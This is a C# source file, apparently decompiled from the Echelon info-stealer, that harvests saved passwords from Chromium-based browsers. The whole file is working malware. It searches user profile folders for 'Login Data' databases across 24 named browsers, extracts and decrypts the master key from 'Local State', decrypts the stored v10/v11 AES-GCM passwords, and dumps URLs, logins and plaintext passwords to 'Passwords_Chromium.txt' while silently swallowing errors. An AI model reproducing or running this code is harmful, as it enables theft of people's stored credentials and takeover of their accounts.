using Echelon;
using System;
using System.Collections.Generic;
using System.IO;
using System.Linq;
using System.Text;
using System.Text.RegularExpressions;

internal class q
{
	public static int a = 0;

	private static string m_b = Path.GetTempPath();

	private static readonly string[] c = new string[24]
	{
		"Google",
		"Yandex",
		"Orbitum",
		"Opera",
		"Amigo",
		"Torch",
		"Comodo",
		"CentBrowser",
		"Go!",
		"uCozMedia",
		"Rockmelt",
		"Sleipnir",
		"SRWare Iron",
		"Vivaldi",
		"Sputnik",
		"Maxthon",
		"AcWebBrowser",
		"Epic Browser",
		"MapleStudio",
		"BlackHawk",
		"Flock",
		"CoolNovo",
		"Baidu Spark",
		"Titan Browser"
	};

	public static void a(string ar)
	{
		try
		{
			string text = "";
			List<string> list = new List<string>();
			List<string> obj = new List<string>
			{
				Global.AppDate,
				Global.LocalData
			};
			List<string> list2 = new List<string>();
			foreach (string item in obj)
			{
				try
				{
					list2.AddRange(Directory.GetDirectories(item));
				}
				catch
				{
				}
			}
			foreach (string item2 in list2)
			{
				string[] array = null;
				try
				{
					list.AddRange(Directory.GetFiles(item2, "Login Data", SearchOption.AllDirectories));
					array = Directory.GetFiles(item2, "Login Data", SearchOption.AllDirectories);
				}
				catch
				{
				}
				if (array != null)
				{
					string[] array2 = array;
					foreach (string text2 in array2)
					{
						try
						{
							if (File.Exists(text2))
							{
								string str = "Unknown (" + item2 + ")";
								string[] array3 = c;
								foreach (string text3 in array3)
								{
									if (item2.Contains(text3))
									{
										str = text3;
									}
								}
								string sourceFileName = text2;
								string sourceFileName2 = text2 + "\\..\\..\\Local State";
								if (File.Exists(q.m_b + "\\bd.temp"))
								{
									File.Delete(q.m_b + "\\bd.temp");
								}
								if (File.Exists(q.m_b + "\\ls.temp"))
								{
									File.Delete(q.m_b + "\\ls.temp");
								}
								File.Copy(sourceFileName, q.m_b + "\\bd.temp");
								File.Copy(sourceFileName2, q.m_b + "\\ls.temp");
								x x = new x(q.m_b + "\\bd.temp");
								x.e("logins");
								string text4 = File.ReadAllText(q.m_b + "\\ls.temp");
								string[] array4 = Regex.Split(text4, "\"");
								int num = 0;
								array3 = array4;
								for (int j = 0; j < array3.Length; j++)
								{
									if (array3[j] == "encrypted_key")
									{
										text4 = array4[num + 2];
										break;
									}
									num++;
								}
								byte[] key = u.a(Encoding.Default.GetBytes(Encoding.Default.GetString(Convert.FromBase64String(text4)).Remove(0, 5)));
								int num2 = x.b();
								for (int k = 0; k < num2; k++)
								{
									try
									{
										string text5 = x.a(k, 5);
										byte[] bytes = Encoding.Default.GetBytes(text5);
										string str2 = "";
										try
										{
											if (text5.StartsWith("v10") || text5.StartsWith("v11"))
											{
												byte[] iv = bytes.Skip(3).Take(12).ToArray();
												str2 = AesGcm256.Decrypt(bytes.Skip(15).ToArray(), key, iv);
											}
											else
											{
												str2 = Encoding.Default.GetString(u.a(bytes));
											}
										}
										catch (Exception value)
										{
											Console.WriteLine(value);
										}
										text = text + "Url: " + x.a(k, 1) + "\r\n";
										text = text + "Login: " + x.a(k, 3).Normalize() + "\r\n";
										text = text + "Password: " + str2 + "\r\n";
										text = text + "Browser: " + str + "\r\n\r\n";
										q.a++;
									}
									catch
									{
									}
								}
								File.Delete(q.m_b + "\\bd.temp");
								File.Delete(q.m_b + "\\ls.temp");
							}
						}
						catch
						{
						}
					}
				}
			}
			if (text != "")
			{
				File.WriteAllText(ar, text, Encoding.Default);
			}
		}
		catch
		{
		}
	}

	public static void b(string @as)
	{
		a(@as + "\\Passwords_Chromium.txt");
	}
}
